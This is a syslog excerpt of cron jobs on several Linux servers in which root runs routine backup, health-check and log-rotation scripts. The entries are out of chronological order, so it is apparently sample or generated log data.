Mar 23 13:23:09 LNX-DEV-001 CRON[1505]: (root) CMD (/usr/local/bin/backup.sh)
Mar 19 10:04:30 LNX-BACKUP-001 CRON[1554]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 13 15:24:12 LNX-WEB-001 CRON[6596]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 25 08:05:29 LNX-APP-001 CRON[1562]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 26 17:14:59 LNX-APP-001 CRON[1554]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 20 12:07:26 LNX-BACKUP-001 CRON[8678]: (root) CMD (/usr/local/bin/backup.sh)
Mar 30 16:47:27 LNX-BACKUP-001 CRON[2419]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 11 08:26:15 LNX-APP-002 CRON[7364]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 11 10:48:44 LNX-BACKUP-001 CRON[1769]: (root) CMD (/usr/local/bin/backup.sh)
Mar 16 10:56:54 LNX-WEB-002 CRON[7987]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 04 11:45:02 LNX-DEV-001 CRON[4777]: (root) CMD (/usr/local/bin/backup.sh)
Mar 27 14:58:11 LNX-WEB-002 CRON[7111]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 17 09:06:23 LNX-APP-002 CRON[6708]: (root) CMD (/usr/local/bin/backup.sh)
Mar 06 13:22:16 LNX-APP-001 CRON[2815]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 21 09:43:21 LNX-APP-001 CRON[3751]: (root) CMD (/usr/local/bin/backup.sh)
Mar 21 17:25:56 LNX-WEB-001 CRON[9265]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 20 13:08:14 LNX-DB-002 CRON[9581]: (root) CMD (/usr/local/bin/backup.sh)
Mar 23 16:01:12 LNX-DEV-001 CRON[3988]: (root) CMD (/usr/local/bin/backup.sh)
Mar 16 17:48:37 LNX-APP-002 CRON[6215]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 12 14:09:39 LNX-WEB-002 CRON[8447]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 04 09:37:23 LNX-DB-001 CRON[9164]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 15 13:18:15 LNX-LOG-001 CRON[2828]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 18 16:31:50 LNX-DB-001 CRON[7364]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 24 11:29:27 LNX-DB-002 CRON[6147]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 04 15:45:06 LNX-APP-002 CRON[1514]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 17 17:25:09 LNX-DB-002 CRON[6564]: (root) CMD (/usr/local/bin/backup.sh)
Mar 16 12:11:13 LNX-FILE-001 CRON[1237]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 15 10:03:54 LNX-DB-001 CRON[1590]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 14 08:32:45 LNX-BACKUP-001 CRON[8240]: (root) CMD (/usr/local/bin/backup.sh)
Mar 18 09:11:00 LNX-BACKUP-001 CRON[5240]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 01 12:45:39 LNX-DB-002 CRON[6408]: (root) CMD (/usr/local/bin/backup.sh)
Mar 16 15:50:41 LNX-WEB-002 CRON[5077]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 07 13:14:46 LNX-LOG-001 CRON[3420]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 18 12:13:00 LNX-BACKUP-001 CRON[6870]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 09 17:54:56 LNX-WEB-001 CRON[1997]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 09 08:49:28 LNX-LOG-001 CRON[2515]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 17 13:41:18 LNX-FILE-001 CRON[6618]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 07 09:50:49 LNX-APP-002 CRON[3278]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 04 14:02:32 LNX-APP-001 CRON[6577]: (root) CMD (/usr/local/bin/backup.sh)
Mar 10 10:11:42 LNX-FILE-001 CRON[1579]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 05 13:58:17 LNX-FILE-001 CRON[3955]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 23 09:55:03 LNX-FILE-001 CRON[9534]: (root) CMD (/usr/local/bin/backup.sh)
Mar 19 16:22:43 LNX-APP-002 CRON[5961]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 08 08:53:15 LNX-APP-001 CRON[7294]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 20 15:45:48 LNX-WEB-002 CRON[4930]: (root) CMD (/usr/local/bin/backup.sh)
Mar 30 16:17:17 LNX-FILE-001 CRON[4246]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 10 13:30:43 LNX-DEV-001 CRON[8487]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 24 15:26:26 LNX-DB-001 CRON[7143]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 26 08:09:49 LNX-WEB-001 CRON[5150]: (root) CMD (/usr/local/bin/backup.sh)
Mar 11 10:24:10 LNX-DB-002 CRON[9309]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 30 13:48:17 LNX-DB-002 CRON[3745]: (root) CMD (/usr/local/bin/backup.sh)
Mar 12 09:44:12 LNX-BACKUP-001 CRON[5515]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 26 16:34:05 LNX-BACKUP-001 CRON[7753]: (root) CMD (/usr/local/bin/backup.sh)
Mar 29 10:36:47 LNX-BACKUP-001 CRON[2954]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 25 11:30:41 LNX-WEB-002 CRON[6225]: (root) CMD (/usr/local/bin/backup.sh)
Mar 28 11:58:55 LNX-LOG-001 CRON[1916]: (root) CMD (/usr/local/bin/backup.sh)
Mar 10 16:57:15 LNX-WEB-001 CRON[1413]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 18 09:03:56 LNX-WEB-001 CRON[1948]: (root) CMD (/usr/local/bin/backup.sh)
Mar 27 12:31:04 LNX-DB-001 CRON[3449]: (root) CMD (/usr/local/bin/backup.sh)
Mar 07 16:27:03 LNX-APP-002 CRON[8494]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 30 09:54:42 LNX-APP-001 CRON[3032]: (root) CMD (/usr/local/bin/backup.sh)
Mar 17 09:03:08 LNX-APP-002 CRON[9073]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 16 14:17:43 LNX-DEV-001 CRON[5742]: (root) CMD (/usr/local/bin/backup.sh)
Mar 17 13:17:56 LNX-DB-002 CRON[3149]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 08 08:37:13 LNX-FILE-001 CRON[2660]: (root) CMD (/usr/local/bin/backup.sh)
Mar 29 13:48:13 LNX-DB-002 CRON[9614]: (root) CMD (/usr/local/bin/backup.sh)
Mar 18 12:52:08 LNX-DB-002 CRON[8638]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 02 09:35:17 LNX-APP-001 CRON[8333]: (root) CMD (/usr/local/bin/backup.sh)
Mar 12 17:29:50 LNX-FILE-001 CRON[3210]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 08 09:11:27 LNX-APP-002 CRON[3617]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 23 08:40:23 LNX-DB-001 CRON[8617]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 20 11:00:04 LNX-FILE-001 CRON[9952]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 30 08:56:42 LNX-DB-002 CRON[4962]: (root) CMD (/usr/local/bin/backup.sh)
Mar 04 12:37:38 LNX-WEB-002 CRON[3725]: (root) CMD (/usr/local/bin/backup.sh)
Mar 27 09:28:23 LNX-WEB-002 CRON[6440]: (root) CMD (/usr/local/bin/backup.sh)
Mar 04 16:38:45 LNX-APP-002 CRON[2149]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 14 15:12:09 LNX-DB-001 CRON[6998]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 29 09:28:33 LNX-DEV-001 CRON[3034]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 22 13:29:37 LNX-DB-002 CRON[1004]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 21 08:49:17 LNX-LOG-001 CRON[4562]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 02 17:18:41 LNX-FILE-001 CRON[9055]: (root) CMD (/usr/local/bin/backup.sh)
Mar 06 16:01:15 LNX-APP-001 CRON[1656]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 27 10:37:19 LNX-LOG-001 CRON[8923]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 14 10:08:32 LNX-FILE-001 CRON[4883]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 15 13:50:59 LNX-LOG-001 CRON[7539]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 26 16:04:04 LNX-APP-002 CRON[1046]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 17 15:57:36 LNX-WEB-002 CRON[4025]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 06 17:15:02 LNX-BACKUP-001 CRON[3573]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 09 14:35:39 LNX-DB-001 CRON[7843]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 25 09:20:22 LNX-FILE-001 CRON[1013]: (root) CMD (/usr/local/bin/backup.sh)
Mar 10 14:28:25 LNX-APP-002 CRON[9794]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 06 14:05:31 LNX-WEB-001 CRON[8136]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 11 14:09:43 LNX-FILE-001 CRON[5173]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 10 17:00:00 LNX-WEB-001 CRON[9663]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 13 13:30:25 LNX-DEV-001 CRON[4792]: (root) CMD (/usr/local/bin/backup.sh)
Mar 18 08:48:37 LNX-APP-002 CRON[2964]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 27 16:05:30 LNX-WEB-001 CRON[2486]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 14 11:12:09 LNX-APP-001 CRON[8981]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 11 08:13:19 LNX-APP-001 CRON[5042]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 09 17:05:33 LNX-DB-002 CRON[8264]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 26 13:55:24 LNX-DB-001 CRON[4051]: (root) CMD (/usr/local/bin/backup.sh)
Mar 04 11:33:19 LNX-WEB-002 CRON[5473]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 12 10:41:39 LNX-WEB-001 CRON[9058]: (root) CMD (/usr/local/bin/backup.sh)
Mar 21 17:12:15 LNX-WEB-002 CRON[5079]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 04 10:43:49 LNX-APP-002 CRON[5217]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 09 15:27:07 LNX-DB-002 CRON[8487]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 18 08:57:55 LNX-DB-002 CRON[7637]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 09 13:10:52 LNX-DB-002 CRON[5885]: (root) CMD (/usr/local/bin/backup.sh)
Mar 18 11:05:40 LNX-APP-002 CRON[3350]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 24 11:15:45 LNX-LOG-001 CRON[9398]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 16 09:37:57 LNX-WEB-002 CRON[6607]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 16 17:34:08 LNX-DB-002 CRON[5480]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 23 09:13:39 LNX-WEB-002 CRON[7441]: (root) CMD (/usr/local/bin/backup.sh)
Mar 16 14:06:10 LNX-DEV-001 CRON[4387]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 28 15:24:42 LNX-DB-002 CRON[4029]: (root) CMD (/usr/local/bin/backup.sh)
Mar 25 08:31:54 LNX-DB-002 CRON[7962]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 16 16:34:32 LNX-DB-002 CRON[9455]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 16 16:55:01 LNX-WEB-002 CRON[8035]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 30 09:29:56 LNX-DEV-001 CRON[2207]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 24 17:01:59 LNX-WEB-001 CRON[8952]: (root) CMD (/usr/local/bin/backup.sh)
Mar 14 13:00:42 LNX-APP-002 CRON[1262]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 14 10:10:50 LNX-WEB-002 CRON[8605]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 17 08:08:34 LNX-DB-001 CRON[3162]: (root) CMD (/usr/local/bin/backup.sh)
Mar 17 16:09:26 LNX-APP-002 CRON[8818]: (root) CMD (/usr/local/bin/backup.sh)
Mar 28 13:36:01 LNX-WEB-001 CRON[4840]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 30 16:10:00 LNX-WEB-002 CRON[8621]: (root) CMD (/usr/local/bin/backup.sh)
Mar 06 15:22:54 LNX-LOG-001 CRON[3598]: (root) CMD (/usr/local/bin/backup.sh)
Mar 08 08:28:16 LNX-DEV-001 CRON[1322]: (root) CMD (/usr/local/bin/backup.sh)
Mar 22 15:52:19 LNX-DB-001 CRON[6628]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 27 17:15:39 LNX-LOG-001 CRON[6397]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 24 16:17:05 LNX-LOG-001 CRON[8731]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 05 12:21:20 LNX-WEB-002 CRON[2883]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 09 10:06:06 LNX-LOG-001 CRON[4001]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 07 12:58:24 LNX-WEB-002 CRON[9293]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 07 11:34:39 LNX-BACKUP-001 CRON[2174]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 17 13:58:54 LNX-FILE-001 CRON[2048]: (root) CMD (/usr/local/bin/backup.sh)
Mar 05 11:03:06 LNX-DEV-001 CRON[8035]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 16 14:04:32 LNX-WEB-002 CRON[8470]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 06 15:55:13 LNX-LOG-001 CRON[7804]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 15 13:05:02 LNX-WEB-001 CRON[9639]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 15 17:31:03 LNX-APP-001 CRON[9660]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 13 14:19:07 LNX-DB-002 CRON[1663]: (root) CMD (/usr/local/bin/backup.sh)
Mar 30 11:50:18 LNX-DB-002 CRON[5156]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 27 17:30:50 LNX-BACKUP-001 CRON[8332]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 01 12:32:33 LNX-DEV-001 CRON[8592]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 23 11:23:22 LNX-BACKUP-001 CRON[5191]: (root) CMD (/usr/local/bin/backup.sh)
Mar 16 09:14:34 LNX-WEB-001 CRON[9354]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 08 16:49:29 LNX-DB-002 CRON[6131]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 23 12:27:35 LNX-WEB-002 CRON[6071]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 09 12:01:29 LNX-LOG-001 CRON[2445]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 15 15:17:13 LNX-DB-002 CRON[9540]: (root) CMD (/usr/local/bin/backup.sh)
Mar 04 13:00:09 LNX-WEB-001 CRON[3640]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 09 10:18:56 LNX-DEV-001 CRON[9814]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 18 09:15:37 LNX-WEB-001 CRON[1038]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 21 12:31:47 LNX-FILE-001 CRON[8736]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 25 10:48:17 LNX-DB-001 CRON[2881]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 14 14:52:26 LNX-APP-001 CRON[7690]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 04 11:42:31 LNX-BACKUP-001 CRON[6765]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 12 15:32:34 LNX-LOG-001 CRON[4829]: (root) CMD (/usr/local/bin/backup.sh)
Mar 20 10:45:08 LNX-FILE-001 CRON[8256]: (root) CMD (/usr/local/bin/backup.sh)
Mar 23 17:59:07 LNX-WEB-002 CRON[7995]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 14 17:08:32 LNX-DB-002 CRON[4243]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 29 15:39:18 LNX-FILE-001 CRON[2108]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 07 15:22:21 LNX-APP-002 CRON[8145]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 03 13:13:16 LNX-BACKUP-001 CRON[5913]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 27 13:05:59 LNX-APP-002 CRON[9237]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 29 08:39:04 LNX-APP-001 CRON[8737]: (root) CMD (/usr/local/bin/backup.sh)
Mar 04 13:07:17 LNX-FILE-001 CRON[3082]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 28 11:12:59 LNX-WEB-002 CRON[6234]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 20 08:05:04 LNX-LOG-001 CRON[5048]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 25 16:07:15 LNX-WEB-001 CRON[4761]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 20 08:44:59 LNX-WEB-002 CRON[4281]: (root) CMD (/usr/local/bin/backup.sh)
Mar 14 15:17:55 LNX-DB-001 CRON[2930]: (root) CMD (/usr/local/bin/backup.sh)
Mar 23 12:41:24 LNX-BACKUP-001 CRON[5582]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 19 14:08:11 LNX-DEV-001 CRON[4566]: (root) CMD (/usr/local/bin/backup.sh)
Mar 20 14:53:51 LNX-LOG-001 CRON[6835]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 13 14:34:31 LNX-WEB-001 CRON[7058]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 23 16:54:30 LNX-APP-002 CRON[1133]: (root) CMD (/usr/local/bin/backup.sh)
Mar 19 16:24:29 LNX-FILE-001 CRON[9814]: (root) CMD (/usr/local/bin/backup.sh)
Mar 01 08:07:46 LNX-DB-001 CRON[4640]: (root) CMD (/usr/local/bin/backup.sh)
Mar 12 13:36:33 LNX-WEB-001 CRON[3967]: (root) CMD (/usr/local/bin/backup.sh)
Mar 29 08:07:58 LNX-LOG-001 CRON[9777]: (root) CMD (/usr/local/bin/backup.sh)
Mar 15 10:38:38 LNX-WEB-002 CRON[8791]: (root) CMD (/usr/local/bin/backup.sh)
Mar 27 12:13:27 LNX-BACKUP-001 CRON[4326]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 23 09:22:50 LNX-FILE-001 CRON[4581]: (root) CMD (/usr/local/bin/backup.sh)
Mar 30 09:10:06 LNX-WEB-002 CRON[1712]: (root) CMD (/usr/local/bin/backup.sh)
Mar 15 12:52:09 LNX-APP-001 CRON[1449]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 18 11:22:51 LNX-FILE-001 CRON[1994]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 01 15:59:20 LNX-FILE-001 CRON[2722]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 04 16:46:01 LNX-DEV-001 CRON[3140]: (root) CMD (/usr/local/bin/backup.sh)
Mar 09 14:00:21 LNX-LOG-001 CRON[2710]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 01 09:03:25 LNX-FILE-001 CRON[8378]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 26 16:01:04 LNX-DEV-001 CRON[9323]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 28 15:01:41 LNX-DEV-001 CRON[4564]: (root) CMD (/usr/local/bin/backup.sh)
Mar 25 13:26:14 LNX-DEV-001 CRON[6495]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 24 15:26:14 LNX-LOG-001 CRON[2284]: (root) CMD (/usr/local/bin/backup.sh)
Mar 16 13:01:33 LNX-APP-001 CRON[5451]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 15 08:07:32 LNX-WEB-002 CRON[8955]: (root) CMD (/usr/local/bin/backup.sh)
Mar 01 16:46:54 LNX-APP-002 CRON[2338]: (root) CMD (/usr/local/bin/backup.sh)
Mar 24 14:38:51 LNX-DEV-001 CRON[7726]: (root) CMD (/usr/local/bin/backup.sh)
Mar 27 16:40:27 LNX-BACKUP-001 CRON[5588]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 07 14:43:24 LNX-BACKUP-001 CRON[2049]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 04 09:46:59 LNX-APP-001 CRON[9976]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 29 12:06:29 LNX-DB-001 CRON[7350]: (root) CMD (/usr/local/bin/backup.sh)
Mar 02 13:07:36 LNX-WEB-001 CRON[5043]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 30 08:03:19 LNX-LOG-001 CRON[9085]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 06 14:48:26 LNX-DEV-001 CRON[8775]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 05 11:30:43 LNX-BACKUP-001 CRON[9415]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 26 08:45:09 LNX-DEV-001 CRON[3602]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 09 12:11:54 LNX-WEB-002 CRON[4067]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 16 09:11:07 LNX-LOG-001 CRON[2674]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 20 13:08:19 LNX-DB-001 CRON[5073]: (root) CMD (/usr/local/bin/backup.sh)
Mar 19 11:27:00 LNX-DB-002 CRON[2411]: (root) CMD (/usr/local/bin/backup.sh)
Mar 03 10:05:55 LNX-APP-001 CRON[3572]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 13 16:07:43 LNX-DEV-001 CRON[4141]: (root) CMD (/usr/local/bin/backup.sh)
Mar 02 11:51:53 LNX-LOG-001 CRON[1944]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 24 17:06:45 LNX-FILE-001 CRON[2787]: (root) CMD (/usr/local/bin/backup.sh)
Mar 05 13:38:49 LNX-LOG-001 CRON[6407]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 30 12:58:25 LNX-LOG-001 CRON[8350]: (root) CMD (/usr/local/bin/backup.sh)
Mar 19 13:10:34 LNX-LOG-001 CRON[2244]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 07 08:38:18 LNX-DEV-001 CRON[4592]: (root) CMD (/usr/local/bin/backup.sh)
Mar 26 13:35:49 LNX-WEB-001 CRON[4372]: (root) CMD (/usr/local/bin/backup.sh)
Mar 20 16:30:08 LNX-DB-001 CRON[8260]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 09 12:56:18 LNX-WEB-002 CRON[4197]: (root) CMD (/usr/local/bin/backup.sh)
Mar 05 08:29:26 LNX-DB-001 CRON[9485]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 24 08:36:02 LNX-LOG-001 CRON[3744]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 06 14:42:16 LNX-APP-001 CRON[6690]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 07 09:19:48 LNX-LOG-001 CRON[3699]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 01 12:13:13 LNX-BACKUP-001 CRON[6962]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 01 17:23:19 LNX-FILE-001 CRON[6092]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 12 11:52:32 LNX-APP-002 CRON[8778]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 14 08:03:23 LNX-WEB-001 CRON[3684]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 17 13:55:10 LNX-BACKUP-001 CRON[2135]: (root) CMD (/usr/local/bin/backup.sh)
Mar 22 13:18:38 LNX-FILE-001 CRON[8721]: (root) CMD (/usr/local/bin/backup.sh)
Mar 01 09:42:29 LNX-WEB-002 CRON[8842]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 20 12:09:51 LNX-WEB-002 CRON[2400]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 11 13:17:54 LNX-DB-002 CRON[5184]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 02 10:00:05 LNX-DB-002 CRON[9444]: (root) CMD (/usr/local/bin/backup.sh)
Mar 21 16:14:08 LNX-DB-002 CRON[4457]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 18 17:08:36 LNX-WEB-002 CRON[3174]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 09 17:06:29 LNX-APP-002 CRON[2195]: (root) CMD (/usr/local/bin/backup.sh)
Mar 06 16:24:37 LNX-BACKUP-001 CRON[1597]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 30 17:44:00 LNX-FILE-001 CRON[1725]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 07 16:10:26 LNX-LOG-001 CRON[7101]: (root) CMD (/usr/local/bin/backup.sh)
Mar 20 12:49:14 LNX-LOG-001 CRON[6050]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 05 10:25:45 LNX-DB-001 CRON[5669]: (root) CMD (/usr/local/bin/backup.sh)
Mar 22 14:45:32 LNX-BACKUP-001 CRON[5102]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 20 09:44:01 LNX-APP-002 CRON[5357]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 12 11:59:05 LNX-APP-002 CRON[3610]: (root) CMD (/usr/local/bin/backup.sh)
Mar 29 15:55:23 LNX-DB-001 CRON[6491]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 03 10:30:19 LNX-BACKUP-001 CRON[4155]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 28 09:01:46 LNX-LOG-001 CRON[9926]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 21 17:17:32 LNX-WEB-001 CRON[6919]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 08 11:40:55 LNX-APP-002 CRON[8800]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 13 15:10:00 LNX-APP-001 CRON[6603]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 03 17:04:48 LNX-FILE-001 CRON[3338]: (root) CMD (/usr/local/bin/backup.sh)
Mar 09 09:20:01 LNX-WEB-002 CRON[9878]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 17 14:34:35 LNX-LOG-001 CRON[8651]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 02 17:55:15 LNX-WEB-001 CRON[6245]: (root) CMD (/usr/local/bin/backup.sh)
Mar 06 17:21:35 LNX-DB-002 CRON[3213]: (root) CMD (/usr/local/bin/backup.sh)
Mar 17 17:20:17 LNX-DB-002 CRON[8558]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 17 17:11:52 LNX-LOG-001 CRON[6557]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 14 14:01:14 LNX-BACKUP-001 CRON[4226]: (root) CMD (/usr/local/bin/backup.sh)
Mar 13 11:15:50 LNX-DB-002 CRON[7879]: (root) CMD (/usr/local/bin/backup.sh)
Mar 09 10:07:59 LNX-DEV-001 CRON[4691]: (root) CMD (/usr/local/bin/backup.sh)
Mar 05 17:46:37 LNX-BACKUP-001 CRON[9065]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 13 17:01:57 LNX-WEB-002 CRON[1775]: (root) CMD (/usr/local/bin/backup.sh)
Mar 02 17:07:17 LNX-DEV-001 CRON[7018]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 13 16:26:13 LNX-FILE-001 CRON[3197]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 16 10:48:07 LNX-WEB-002 CRON[3781]: (root) CMD (/usr/local/bin/backup.sh)
Mar 02 14:00:14 LNX-BACKUP-001 CRON[5394]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 28 10:41:54 LNX-DB-002 CRON[3333]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 17 11:18:01 LNX-BACKUP-001 CRON[6983]: (root) CMD (/usr/local/bin/backup.sh)
Mar 12 14:17:30 LNX-FILE-001 CRON[9074]: (root) CMD (/usr/local/bin/log_rotate.sh)
Mar 25 17:19:27 LNX-APP-001 CRON[7309]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 05 12:50:40 LNX-DB-001 CRON[2346]: (root) CMD (/usr/local/bin/health_check.sh)
Mar 28 08:01:22 LNX-DB-001 CRON[6453]: (root) CMD (/usr/local/bin/log_rotate.sh)
